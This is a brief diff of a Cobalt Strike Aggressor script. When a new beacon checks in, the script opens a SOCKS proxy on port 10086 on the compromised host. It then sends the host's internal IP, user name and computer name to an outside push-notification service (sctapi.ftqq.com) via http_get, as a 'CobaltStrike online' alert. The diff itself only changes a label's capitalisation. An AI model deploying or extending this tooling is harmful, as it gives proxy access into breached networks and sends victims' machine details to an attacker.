@@ -25,7 +25,7 @@ on beacon_initial {
     bsocks($1, 10086);
     println('Socket IP:'.$internalIP.'   Socket Port:10086');
     #get一下Server酱的链接
-	  $url = 'https://sctapi.ftqq.com/XXXXXXXXXXXX(key).send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&desp=ip:'.$internalIP.'%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:'.$userName.'%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:'.$computerName.'%0D%0A%0D%0ASocket_IP:'.$internalIP.'%0D%0A%0D%0ASocket_Port:10086';
+	  $url = 'https://sctapi.ftqq.com/XXXXXXXXXXXX(key).send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&desp=IP:'.$internalIP.'%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:'.$userName.'%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:'.$computerName.'%0D%0A%0D%0ASocket_IP:'.$internalIP.'%0D%0A%0D%0ASocket_Port:10086';
 
     http_get($url);
 
